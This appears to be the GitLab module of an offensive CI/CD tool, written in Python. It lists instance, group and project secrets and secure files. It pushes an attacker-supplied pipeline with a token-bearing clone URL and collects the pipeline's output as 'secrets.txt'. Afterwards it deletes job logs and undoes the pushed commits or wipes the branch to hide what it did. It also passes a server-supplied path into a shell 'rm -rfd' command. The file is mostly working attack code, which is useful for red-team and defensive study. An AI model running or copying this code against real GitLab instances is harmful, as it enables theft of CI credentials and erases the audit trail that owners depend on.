import logging

from urllib.parse import urlparse
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess
import time
from nordstream.utils.errors import GitLabError
from nordstream.yaml.gitlab import GitLabPipelineGenerator
from nordstream.parsers.gitlab import merge_runners
from nordstream.core.base import BaseRunner
from nordstream.report.gitlab import (
    displayRunner,
    displayVariable,
    displaySecureFile,
    displayProject,
    displayUser,
    displayGroup,
    displayTokenInfo,
    displayBranchesProtectionRulesPriv,
    displayBranchesProtectionRulesUnpriv,
)


class GitLabRunner(BaseRunner):
    extractProject = True
    extractGroup = True
    extractInstance = True
    _sleepTime = 0
    _localPath = None

    def __init__(self, cicd):
        super().__init__(cicd)
        self._createLogDir("gitlab")

    @property
    def sleepTime(self):
        return self._sleepTime

    @sleepTime.setter
    def sleepTime(self, value):
        self._sleepTime = int(value)

    @property
    def localPath(self):
        return self._localPath

    @localPath.setter
    def localPath(self, value):
        if exists(value):
            self._localPath = value
        else:
            logger.critical("Invalid local project path.")

    def getProjects(self, project, strict=False, membership=False):
        if project:
            if exists(project):
                logger.info(f"Getting GitLab projects of a file: {project}")
                with open(project, "r") as file:
                    for p in file:
                        self._cicd.addProjects(
                            project=p.strip(), filterWrite=self.writeAccessFilter, strict=strict, membership=membership
                        )

            else:
                logger.info(f"Getting GitLab project: {project}")
                self._cicd.addProjects(
                    project=project, filterWrite=self.writeAccessFilter, strict=strict, membership=membership
                )
        else:
            logger.info(f"Listing GitLab projects")
            self._cicd.addProjects(filterWrite=self.writeAccessFilter, membership=membership)

        if len(self._cicd.projects) == 0:
            if self.writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def getGroups(self, group):
        if group:
            if exists(group):
                logger.info(f"Getting GitLab groups of a file: {group}")
                with open(group, "r") as file:
                    for p in file:
                        self._cicd.addGroups(group)

            else:
                logger.info(f"Getting GitLab group: {group}")
                self._cicd.addGroups(group)
        else:
            logger.info(f"Listing GitLab groups")
            self._cicd.addGroups()

        if len(self._cicd.groups) == 0:
            logger.error("No group found.")

    def listGitLabRunners(self):
        logger.info("Listing GitLab runners")

        res = False
        if self.extractProject:
            res |= self.__listGitLabProjectRunners()

        if not res:
            logger.warning("You don't have access to any runner or job")

    def __listGitLabProjectRunners(self):
        res = False
        runners = []
        for project in self._cicd.projects:
            merge_runners(runners, self._cicd.listRunnersFromProject(project))

        for runner in runners:
            res = True
            displayRunner(runner)

        return res

    def listGitLabSecrets(self):
        logger.info("Listing GitLab secrets")

        res = False
        if self.extractInstance:
            res |= self.__listGitLabInstanceSecrets()

        if self.extractGroup:
            res |= self.__listGitLabGroupSecrets()

        if self.extractProject:
            res |= self.__listGitLabProjectSecrets()
            res |= self.__listGitLabProjectSecureFiles()

        if not res:
            logger.warning(
                "You don't have access to any secret, try to deploy a pipeline and exfiltrate environment variables"
            )

    def __listGitLabProjectSecrets(self):
        res = False
        for project in self._cicd.projects:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayProjectVariables(project)
            except Exception as e:
                logger.error(f"Error while listing secrets for {project.get('name')}: {e}")
        return res

    def __listGitLabProjectSecureFiles(self):
        res = False
        for project in self._cicd.projects:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayProjectSecureFiles(project)
            except Exception as e:
                logger.error(f"Error while listing secure files for {project.get('name')}: {e}")
        return res

    def __listGitLabGroupSecrets(self):
        res = False
        for group in self._cicd.groups:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayGroupVariables(group)
            except Exception as e:
                logger.error(f"Error while listing secrets for {group.get('name')}: {e}")
        return res

    def __listGitLabInstanceSecrets(self):
        try:
            return self.__displayInstanceVariables()
        except Exception as e:
            logger.error(f"Error while listing instance secrets: {e}")
            return False

    def __displayProjectVariables(self, project):

        projectName = project.get("path_with_namespace")

        try:
            variables = self._cicd.listVariablesFromProject(project)
            if len(variables) != 0:

                logger.info(f'"{projectName}" project variables')

                for variable in variables:
                    displayVariable(variable)

            variables_inherited = self._cicd.listInheritedVariablesFromProject(project)
            if len(variables_inherited) != 0:

                logger.info(f'"{projectName}" inherited group variables')

                for variable in variables_inherited:
                    displayVariable(variable)

            if (len(variables) > 0) or (len(variables_inherited) > 0):
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" variables')
                logger.error(f"\t{e}")
        return False

    def __displayProjectSecureFiles(self, project):

        projectName = project.get("path_with_namespace")

        try:
            secFiles = self._cicd.listSecureFilesFromProject(project)
            if len(secFiles) != 0:

                logger.info(f'"{projectName}" secure files')

                for file in secFiles:
                    displaySecureFile(file)
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" secure files')
                logger.error(f"\t{e}")
        return False

    def __displayGroupVariables(self, group):

        groupPath = group.get("full_path")

        try:
            variables = self._cicd.listVariablesFromGroup(group)
            if len(variables) != 0:
                logger.info(f'"{groupPath}" group variables:')

                for variable in variables:
                    displayVariable(variable)
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{groupPath}" group variables:')
                logger.error(f"\t{e}")
        return False

    def __displayInstanceVariables(self):
        try:
            variables = self._cicd.listVariablesFromInstance()
            if len(variables) != 0:
                logger.info("Instance variables:")
                for variable in variables:
                    displayVariable(variable)
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info("Instance variables:")
                logger.error(f"\t{e}")
        return False

    def listGitLabProjects(self):
        logger.info("Listing GitLab projects")
        for project in self._cicd.projects:
            displayProject(project)

    def listGitLabUsers(self):
        logger.info("Listing GitLab users")
        for user in self._cicd.listUsers():
            displayUser(user)

    def listGitLabGroups(self):
        logger.info("Listing GitLab groups")
        for group in self._cicd.groups:
            displayGroup(group)

    def runPipeline(self):
        for project in self._cicd.projects:

            repoPath = project.get("path")
            repoName = project.get("name")

            if repoPath != repoName:
                logger.success(f'"{repoName}" ({repoPath})')
            else:
                logger.success(f'"{repoName}"')

            if self._localPath == None:
                domain = urlparse(self._cicd.url).netloc
                if self._cicd.url.startswith("https"):
                    handler = "https"
                else:
                    handler = "http"

                url = f"{handler}://foo:{self._cicd.token}@{domain}/{project.get('path_with_namespace')}"
                Git.gitClone(url)

            else:
                repoPath = self._localPath

            chdir(repoPath)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                # TODO: branch protections
                # if not self._forceDeploy:
                #    self.__checkAndDisableBranchProtectionRules(repo)

                if self._yaml:
                    self.__runCustomPipeline(project)
                else:
                    logger.error("No yaml specify")

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(project)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoPath}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __runCustomPipeline(self, project):
        logger.info(f"Running custom pipeline: {self._yaml}")

        pipelineGenerator = GitLabPipelineGenerator()
        pipelineGenerator.loadFile(self._yaml)

        try:
            pipelineId = self.__launchPipeline(project, pipelineGenerator)
            if pipelineId:
                self._fileName = self._cicd.downloadPipelineOutput(project, pipelineId)
                if self._fileName:
                    self.__extractPipelineOutput(project)
                    logger.empty_line()
        except Exception as e:
            logger.error(f"Error: {e}")

        finally:
            logger.empty_line()

    def __launchPipeline(self, project, pipelineGenerator):
        logger.verbose(f"Launching pipeline.")

        projectId = project.get("id")

        pipelineGenerator.writeFile(f".gitlab-ci.yml")
        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        try:
            if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
                logger.error("Error when pushing code: Everything up-to-date")
                logger.warning(
                    "Your trying to push the same code on an existing branch, modify the yaml file to push it."
                )

            elif pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)

            else:
                self._pushedCommitsCount += 1
                logger.raw(pushOutput.communicate()[1])

                pipelineId, pipelineStatus = self._cicd.waitPipeline(projectId)

                if pipelineStatus == "success":
                    logger.success("Pipeline has successfully terminated.")
                    return pipelineId

                elif pipelineStatus == "failed":
                    self.__displayFailureReasons(projectId, pipelineId)

                return pipelineId

        except Exception as e:
            logger.exception(e)
        finally:
            pass

    def __extractPipelineOutput(self, project, resultsFilename="secrets.txt"):

        projectPath = project.get("path_with_namespace")

        with open(
            f"{self._cicd.outputDir}/{projectPath}/{self._fileName}",
            "rb",
        ) as output:

            pipelineResults = output.read()

        logger.success("Output:")
        logger.raw(pipelineResults, logging.INFO)

    def __clean(self, project):

        if self._pushedCommitsCount > 0:

            projectId = project.get("id")
            if self.cleanLogs:
                logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
                self._cicd.cleanAllLogs(projectId)

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self._deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for project in self._cicd.projects:
            logger.info(f"Cleaning logs for project: {project.get('path_with_namespace')}")
            self._cicd.cleanAllLogs(project.get("id"))

    def describeToken(self):
        response = self._cicd.getUser()
        logger.info("Token information:")
        displayTokenInfo(response)

    def listBranchesProtectionRules(self):
        logger.info("Listing branch protection rules.")
        for project in self._cicd.projects:

            projectName = project.get("path_with_namespace")
            logger.info(f"{projectName}:")

            try:
                protections = self._cicd.getBranchesProtectionRules(project.get("id"))
                displayBranchesProtectionRulesPriv(protections)
            except GitLabError as e:
                logger.verbose(
                    "Not enough privileges to get full details on the branch protection rules for this project, trying to get limited information."
                )
                try:
                    branches = self._cicd.getBranches(project.get("id"))
                    displayBranchesProtectionRulesUnpriv(branches)
                except GitLabError as e:
                    logger.error(f"\t{e}")

            logger.empty_line()

    def __displayFailureReasons(self, projectId, pipelineId):
        logger.error("Pipeline has failed.")

        pipelineFailure = self._cicd.getFailureReasonPipeline(projectId, pipelineId)
        if pipelineFailure:
            logger.error(f"{pipelineFailure}")
        else:
            jobsFailure = self._cicd.getFailureReasonJobs(projectId, pipelineId)

            for failure in jobsFailure:

                name = failure["name"]
                stage = failure["stage"]
                reason = failure["failure_reason"]

                logger.raw(f"\t- {name}: {reason} (stage={stage})\n", logging.INFO)
